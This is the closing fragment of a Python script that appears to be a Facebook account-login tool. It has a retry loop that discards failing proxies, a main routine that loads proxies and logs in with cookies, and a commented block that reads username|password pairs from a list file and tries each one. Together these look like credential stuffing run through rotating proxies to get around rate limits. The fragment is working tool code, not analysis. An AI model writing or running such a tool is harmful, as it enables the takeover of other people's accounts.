                            break
                    else:
                        break
                except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                    if proxy:
                        remove_proxy(proxy)
                    if attempt == 2:
                        pass  # abaikan setelah 3 kali gagal
                    continue
                except Exception as e:
                    break
        log['loop'] += 1

# ==================== MAIN ====================
if __name__ == "__main__":
    create_folders()
    load_proxies()
    LoginFacebook().login_cookie()

# load_proxies()
# for i in open('list.txt', 'r').readlines():
#     username = i.split("|")[0]
#     password = i.split("|")[1]
#     Facebook('', '', '', '').smartlock_login(username, [password])
